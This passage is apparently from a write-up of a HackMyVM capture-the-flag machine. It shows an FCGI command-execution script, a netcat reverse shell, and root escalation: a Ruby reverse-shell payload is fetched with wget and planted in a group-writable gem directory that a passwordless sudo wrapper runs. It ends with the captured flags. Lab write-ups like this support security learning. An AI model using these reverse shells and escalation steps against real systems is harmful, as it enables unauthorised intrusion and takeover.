      cgi-fcgi -bind -connect $HOST:$PORT &> $OUTPUT

    # Print the output
    cat $OUTPUT
done
```

`chmod u+x ./exploit.sh`

`/exploit.sh 192.168.56.133 8888 "whoami"`:
```html
Content-type: text/html; charset=UTF-8

<!--dodi ←
--><!DOCTYPE html>
<html lang="en">

[...]

</html>
```

`nc -lvnp 5555`:
```
listening on [any] 5555 ... ←
```

`./exploit.sh 192.168.56.133 8888 "nc 192.168.56.118 5555 -e /bin/bash"`

```
connect to [192.168.56.118] from (UNKNOWN) [192.168.56.133] 49112 ←
```

![Victim: dodi](https://img.shields.io/badge/Victim-dodi-64b5f6?logo=linux&logoColor=white)

`SHELL=/bin/bash script -q /dev/null`

`whoami`:
```
dodi ←
```

`id`:
```
uid=1001(dodi) gid=1001(dodi) groups=1001(dodi),100(users) ←
```

`cd /home/dodi`

`ls -alps ./`:
```
total 28
4 drwx------ 3 dodi dodi 4096 May 28 11:07 ./
4 drwxr-xr-x 4 root root 4096 May 20 15:14 ../
0 lrwxrwxrwx 1 root root    9 May 20 19:14 .bash_history -> /dev/null
4 -rw-r--r-- 1 dodi dodi  220 May 20 15:14 .bash_logout
4 -rw-r--r-- 1 dodi dodi 3526 May 20 15:14 .bashrc
4 drwxr-xr-x 3 dodi dodi 4096 May 20 15:14 .local/
4 -rw-r--r-- 1 dodi dodi  807 May 20 15:14 .profile
4 -rwx------ 1 dodi dodi   33 May 20 15:14 user.txt ←
```

`cat ./user.txt`:
```
b075b24bdb11990e185c32c43539c39f ←
```

`sudo -l`:
```
Matching Defaults entries for dodi on hacktoys:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User dodi may run the following commands on hacktoys:
    (ALL : ALL) NOPASSWD: /usr/local/bin/rvm_rails.sh ←
```

`ls -l /usr/local/bin/rvm_rails.sh`:
```
-rwxr-xr-x 1 root root 660 May 20 17:02 /usr/local/bin/rvm_rails.sh ←
```

`cat /usr/local/bin/rvm_rails.sh`:
```sh
#!/bin/bash
export rvm_prefix=/usr/local
export MY_RUBY_HOME=/usr/local/rvm/rubies/ruby-3.1.0
export RUBY_VERSION=ruby-3.1.0
export rvm_version=1.29.12
export rvm_bin_path=/usr/local/rvm/bin
export GEM_PATH=/usr/local/rvm/gems/ruby-3.1.0:/usr/local/rvm/gems/ruby-3.1.0@global
export GEM_HOME=/usr/local/rvm/gems/ruby-3.1.0 ←
export PATH=/usr/local/rvm/gems/ruby-3.1.0/bin:/usr/local/rvm/gems/ruby-3.1.0@global/bin:/usr/local/rvm/rubies/ruby-3.1.0/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/local/rvm/bin
export IRBRC=/usr/local/rvm/rubies/ruby-3.1.0/.irbrc
export rvm_path=/usr/local/rvm
exec /usr/local/rvm/gems/ruby-3.1.0/bin/rails "$@" ←
```

`ls -ld /usr/local/rvm/gems/ruby-3.1.0/bin`:
```
drwxrwsr-x 2 root rvm 4096 May 20 16:36 /usr/local/rvm/gems/ruby-3.1.0/bin ←
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`nc -lnvp 6666`:
```
listening on [any] 6666 ... ←
```

`vim ./rails`:
```sh
#!/usr/bin/env ruby
  
require 'socket'  
  
s = Socket.new 2,1  
s.connect Socket.sockaddr_in 6666, '192.168.56.118'  
  
[0,1,2].each { |fd| syscall 33, s.fileno, fd }  
exec '/bin/sh -i'
```

`python3 -m http.server 80`:
```
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... ←
```

![Victim: lidia](https://img.shields.io/badge/Victim-lidia-64b5f6?logo=linux&logoColor=white)

`id`:
```
uid=1000(lidia) gid=1000(lidia) groups=1000(lidia),100(users),1002(rvm) ←
```

`ls -ld /usr/local/rvm/gems/ruby-3.1.0/bin`:
```
drwxrwsr-x 2 root rvm 4096 May 20 16:36 /usr/local/rvm/gems/ruby-3.1.0/bin ←
```

`cd /tmp`

`wget http://192.168.56.118/rails`:
```
--2024-10-07 12:46:02--  http://192.168.56.118/rails
Connecting to 192.168.56.118:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 190 [application/octet-stream]
Saving to: ‘rails’

rails               100%[===================>]     190  --.-KB/s    in 0s      

2024-10-07 12:46:02 (22.3 MB/s) - ‘rails’ saved [190/190] ←
```

`mv ./rails /usr/local/rvm/gems/ruby-3.1.0/bin`

`chmod 777 /usr/local/rvm/gems/ruby-3.1.0/bin/rails`

`sudo /usr/local/bin/rvm_rails.sh`

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

```
connect to [192.168.56.118] from (UNKNOWN) [192.168.56.133] 56222
```

![Victim: root](https://img.shields.io/badge/Victim-root-64b5f6?logo=linux&logoColor=white)

`python3 -c 'import pty; pty.spawn("/bin/bash")' && stty raw -echo && fg; export TERM=xterm; stty rows $(tput lines) cols $(tput cols)`

`whoami`:
```
root ←
```

`id`:
```
uid=0(root) gid=0(root) groups=0(root),1002(rvm)
```

`cd /root`

`ls -alps ./`:
```
total 40
4 drwx------  7 root root 4096 Oct  7 12:20 ./
4 drwxr-xr-x 18 root root 4096 May 28 11:06 ../
0 lrwxrwxrwx  1 root root    9 Mar  9  2024 .bash_history -> /dev/null
4 -rw-r--r--  1 root root  571 May 20 15:14 .bashrc
4 drwxr-xr-x  3 root root 4096 Oct  7 12:20 .bundle/
4 drwxr-xr-x  2 root root 4096 May 20 15:14 .config/
4 drwx------  4 root root 4096 May 20 15:14 .gnupg/
4 drwxr-xr-x  3 root root 4096 May 20 15:14 .local/
4 -rw-r--r--  1 root root  161 May 20 15:14 .profile
4 drwx------  2 root root 4096 May 21 15:43 .ssh/
4 -rwx------  1 root root   33 May 20 15:14 root.txt ←
```

`cat ./root.txt`:
```
64aa5a7aaf42af74ee6b59d5ac5c1509 ←
```

<img src="https://hackmyvm.eu/img/correctflag.png" alt="Machine Hacked!" width="150"/>

---
---
